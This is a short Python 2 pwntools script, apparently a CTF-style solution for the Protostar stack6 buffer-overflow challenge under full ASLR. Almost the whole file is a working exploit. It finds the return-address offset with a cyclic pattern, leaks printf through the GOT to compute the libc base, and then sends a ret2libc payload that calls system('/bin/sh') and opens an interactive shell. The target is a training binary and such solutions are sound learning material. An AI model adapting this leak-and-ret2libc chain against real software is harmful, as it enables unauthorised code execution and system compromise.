#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)
#Description: Solution for protostat stack6 with full ASLR
from pwn import *


context(os='linux', arch='i386',) #log_level='DEBUG')
elf  = ELF('/root/Documents/ROP/protostart_s6/stack6')
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# Stage 1 : Find  eip offset
io = process(elf.path)
io.sendlineafter(':', cyclic(1000))
io.wait()
core = io.corefile
esp = core.esp
pattern = core.read(esp, 4)
offset = cyclic_find(pattern) - 4
success("Found offset @{0}".format(offset))

# Stage 2: Get libc address

payload = flat([cyclic(offset), elf.sym['printf'], elf.sym['getpath'], next(elf.search("%s")) , elf.got['printf']])
io = process(elf.path)
io.sendlineafter(":", payload)
libc.address =  u32(io.recvuntil("\xf7")[-4:].ljust(4, '\x00')) - libc.sym["printf"]
success("libc address will be @{0}".format(hex(libc.address)))

#Stage 3 : Get shell

payload = flat([cyclic(offset), libc.sym["system"], libc.sym['exit'], next(libc.search("/bin/sh\x00"))])
io.sendlineafter(":", payload)
io.interactive()
